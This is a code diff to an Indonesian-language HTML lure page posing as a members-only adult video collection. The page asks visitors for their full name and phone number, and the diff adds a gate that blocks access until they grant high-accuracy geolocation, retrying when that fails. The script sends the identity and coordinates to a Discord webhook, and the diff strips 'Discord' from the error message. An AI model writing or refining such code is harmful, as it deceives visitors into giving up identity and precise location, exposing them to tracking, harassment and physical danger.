@@ -3,14 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Koleksi Video Premium</title>
+    <title>pornvid</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-
         body {
             font-family: 'Arial', sans-serif;
             background: linear-gradient(135deg, #1a1a1a, #2d1b2e, #1a1a1a);
@@ -18,31 +17,26 @@
             min-height: 100vh;
             overflow-x: hidden;
         }
-
         .container {
             max-width: 1200px;
             margin: 0 auto;
             padding: 20px;
         }
-
         .header {
             text-align: center;
             margin-bottom: 40px;
             padding: 20px 0;
         }
-
         .header h1 {
             font-size: 2.5em;
             color: #ff6b9d;
             text-shadow: 0 0 20px rgba(255, 107, 157, 0.3);
             margin-bottom: 10px;
         }
-
         .header p {
             color: #ccc;
             font-size: 1.1em;
         }
-
         .modal {
             position: fixed;
             top: 0;
@@ -55,7 +49,6 @@
             align-items: center;
             z-index: 1000;
         }
-
         .modal-content {
             background: linear-gradient(135deg, #2a1f3d, #1a1a2e);
             padding: 40px;
@@ -66,25 +59,21 @@
             text-align: center;
             border: 2px solid rgba(255, 107, 157, 0.3);
         }
-
         .modal-content h2 {
             color: #ff6b9d;
             margin-bottom: 20px;
             font-size: 1.8em;
         }
-
         .form-group {
             margin-bottom: 20px;
             text-align: left;
         }
-
         .form-group label {
             display: block;
             margin-bottom: 8px;
             color: #ccc;
             font-weight: bold;
         }
-
         .form-group input {
             width: 100%;
             padding: 12px;
@@ -94,13 +83,11 @@
             color: #fff;
             font-size: 16px;
         }
-
         .form-group input:focus {
             outline: none;
             border-color: #ff6b9d;
             box-shadow: 0 0 15px rgba(255, 107, 157, 0.3);
         }
-
         .submit-btn {
             width: 100%;
             padding: 15px;
@@ -113,23 +100,25 @@
             cursor: pointer;
             transition: all 0.3s ease;
         }
-
         .submit-btn:hover {
             transform: translateY(-2px);
             box-shadow: 0 5px 20px rgba(255, 107, 157, 0.4);
         }
-
+        .submit-btn:disabled {
+            background: #666;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
         .video-gallery {
             display: none;
         }
-
         .video-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
             gap: 30px;
             margin-top: 30px;
         }
-
         .video-card {
             background: rgba(255, 255, 255, 0.1);
             border-radius: 15px;
@@ -137,36 +126,30 @@
             border: 2px solid rgba(255, 107, 157, 0.2);
             transition: all 0.3s ease;
         }
-
         .video-card:hover {
             border-color: #ff6b9d;
             transform: translateY(-5px);
             box-shadow: 0 10px 30px rgba(255, 107, 157, 0.2);
         }
-
         .video-card h3 {
             color: #ff6b9d;
             margin-bottom: 15px;
             font-size: 1.3em;
         }
-
         .video-card video {
             width: 100%;
             border-radius: 10px;
             margin-bottom: 15px;
         }
-
         .video-card p {
             color: #ccc;
             line-height: 1.6;
         }
-
         .loading {
             text-align: center;
             color: #ff6b9d;
             font-size: 1.2em;
         }
-
         .error {
             background: rgba(255, 0, 0, 0.2);
             color: #ff6b6b;
@@ -175,7 +158,15 @@
             margin-bottom: 15px;
             border: 1px solid rgba(255, 0, 0, 0.3);
         }
-
+        .location-status {
+            background: rgba(255, 165, 0, 0.2);
+            color: #ffb347;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            border: 1px solid rgba(255, 165, 0, 0.3);
+            text-align: center;
+        }
         @media (max-width: 768px) {
             .header h1 {
                 font-size: 2em;
@@ -197,6 +188,9 @@
         <div class="modal-content">
             <h2>akses video</h2>
             <p style="color: #ccc; margin-bottom: 20px;">Masukkan data diri untuk mengakses koleksi video</p>
+            <div id="locationStatus" class="location-status">
+                Menunggu akses...
+            </div>
             <div id="errorMsg" class="error" style="display: none;"></div>
             <div class="form-group">
                 <label for="fullName">Nama Lengkap:</label>
@@ -206,16 +200,14 @@
                 <label for="phoneNumber">Nomor HP Aktif:</label>
                 <input type="tel" id="phoneNumber" required placeholder="08xxxxxxxxxx">
             </div>
-            <button class="submit-btn" onclick="submitUserData()">Akses Sekarang</button>
+            <button class="submit-btn" id="submitBtn" onclick="submitUserData()" disabled>Menunggu Lokasi...</button>
         </div>
     </div>
-
     <div class="container">
         <div class="header">
-            <h1>Koleksi Video Premium</h1>
+            <h1>Koleksi Video</h1>
             <p>Konten eksklusif untuk member terdaftar</p>
         </div>
-
         <div id="videoGallery" class="video-gallery">
             <div class="video-grid">
                 <div class="video-card">
@@ -226,7 +218,6 @@
                     </video>
                     <p>Konten berkualitas dengan resolusi HD.</p>
                 </div>
-
                 <div class="video-card">
                     <h3>Video 2</h3>
                     <video controls preload="metadata">
@@ -235,7 +226,6 @@
                     </video>
                     <p>Koleksi eksklusif yang tidak akan Anda temukan di tempat lain.</p>
                 </div>
-
                 <div class="video-card">
                     <h3>Video 3</h3>
                     <video controls preload="metadata">
@@ -244,7 +234,6 @@
                     </video>
                     <p>Kualitas terbaik dan lancar.</p>
                 </div>
-
                 <div class="video-card">
                     <h3>Video 4</h3>
                     <video controls preload="metadata">
@@ -256,10 +245,10 @@
             </div>
         </div>
     </div>
-
     <script>
         let userLocation = null;
         let webhookUrl = '';
+        let locationGranted = false;
 
         async function getWebhookUrl() {
             try {
@@ -271,28 +260,61 @@
             }
         }
 
+        function updateLocationStatus(message) {
+            document.getElementById('locationStatus').textContent = message;
+        }
+
+        function enableSubmitButton() {
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = false;
+            btn.textContent = 'Akses Sekarang';
+            document.getElementById('locationStatus').style.display = 'none';
+        }
+
         function requestLocation() {
             if (navigator.geolocation) {
+                updateLocationStatus('Mohon izinkan akses untuk melanjutkan...');
+                
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
                         userLocation = {
                             latitude: position.coords.latitude,
                             longitude: position.coords.longitude
                         };
+                        locationGranted = true;
+                        updateLocationStatus('Lokasi berhasil didapatkan!');
+                        setTimeout(enableSubmitButton, 1000);
                     },
                     function(error) {
-                        console.error('Error getting location:', error);
-                        userLocation = { error: 'Location access denied or failed' };
+                        locationGranted = false;
+                        if (error.code === error.PERMISSION_DENIED) {
+                            updateLocationStatus('Akses ditolak! Refresh halaman dan berikan izin untuk melanjutkan.');
+                            showError('Anda harus memberikan izin lokasi untuk mengakses video');
+                        } else if (error.code === error.POSITION_UNAVAILABLE) {
+                            updateLocationStatus('Lokasi tidak tersedia, coba lagi...');
+                            setTimeout(requestLocation, 3000);
+                        } else if (error.code === error.TIMEOUT) {
+                            updateLocationStatus('Timeout mendapatkan lokasi, coba lagi...');
+                            setTimeout(requestLocation, 3000);
+                        }
+                        userLocation = { error: error.message };
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 60000
                     }
                 );
             } else {
+                updateLocationStatus('Browser tidak mendukung geolokasi');
+                showError('Browser Anda tidak mendukung fitur lokasi');
                 userLocation = { error: 'Geolocation not supported' };
             }
         }
 
         async function sendToDiscord(userData) {
             if (!webhookUrl) return;
-
+            
             const locationText = userLocation?.error ? 
                 userLocation.error : 
                 `${userLocation?.latitude}, ${userLocation?.longitude}`;
@@ -316,7 +338,7 @@
                     body: JSON.stringify({ embeds: [embed] })
                 });
             } catch (error) {
-                console.error('Error sending to Discord:', error);
+                console.error('Error sending:', error);
             }
         }
 
@@ -331,6 +353,11 @@
         }
 
         async function submitUserData() {
+            if (!locationGranted) {
+                showError('Anda harus memberikan izin akses lokasi terlebih dahulu');
+                return;
+            }
+
             hideError();
             
             const fullName = document.getElementById('fullName').value.trim();
@@ -363,8 +390,8 @@
             const hasVisited = localStorage.getItem('siteVisited');
             
             if (!hasVisited) {
-                requestLocation();
                 document.getElementById('userModal').style.display = 'flex';
+                requestLocation();
             } else {
                 document.getElementById('userModal').style.display = 'none';
                 document.getElementById('videoGallery').style.display = 'block';
